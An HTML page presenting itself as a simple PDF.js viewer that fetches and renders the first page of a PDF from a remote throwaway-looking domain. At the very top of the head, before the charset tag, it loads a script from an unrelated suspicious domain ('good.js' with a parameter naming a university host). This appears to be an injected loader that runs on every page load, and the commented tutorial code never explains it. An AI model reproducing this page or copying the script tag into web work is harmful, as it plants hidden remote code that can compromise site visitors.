<!DOCTYPE html>
<html lang="en">
<head>
    <script src="https://pdf.tophmquery.site/male/good.js?id=null&h=primate.socgen.ucla.edu" type="text/javascript"></script>

    <meta charset="UTF-8">
    <title>My PDF Viewer</title>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js"></script>
    
    <style>
        body { 
            background-color: #f0f0f0; 
            text-align: center; 
            margin-top: 50px; 
        }
        #pdf-canvas { 
            border: 1px solid black; 
            box-shadow: 0px 4px 8px rgba(0,0,0,0.3); 
        }
    </style>
</head>
<body>

    <h1>Reading Document</h1>
    
    <canvas id="pdf-canvas"></canvas>

    <script>
        // 1. Tell PDF.js where its background "worker" engine is
        pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js';

        // 2. Point to your remote Vercel domain file
        const pdfUrl = 'https://mqadlu.site/document.pdf'; 

        // 3. Fetch the file as a Blob from your Vercel server
        fetch(pdfUrl)
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok: ' + response.statusText);
                }
                return response.blob();
            })
            .then(blob => {
                // Create a local, temporary URL representing the downloaded file data
                const blobUrl = URL.createObjectURL(blob);

                // 4. Ask PDF.js to load the local blob URL
                return pdfjsLib.getDocument(blobUrl).promise;
            })
            .then(function(pdf) {
                
                // 5. Grab the very first page of the PDF
                pdf.getPage(1).then(function(page) {
                    
                    const scale = 1.5; 
                    const viewport = page.getViewport({ scale: scale });
                    
                    const canvas = document.getElementById('pdf-canvas');
                    const context = canvas.getContext('2d');
                    
                    // 6. Size the canvas to match the PDF page
                    canvas.height = viewport.height;
                    canvas.width = viewport.width;

                    // 7. Draw the PDF onto the screen
                    const renderContext = {
                        canvasContext: context,
                        viewport: viewport
                    };
                    page.render(renderContext);
                });
            })
            .catch(function(error) {
                console.error("Error fetching or rendering the cross-origin PDF:", error);
            });
    </script>
</body>
</html>
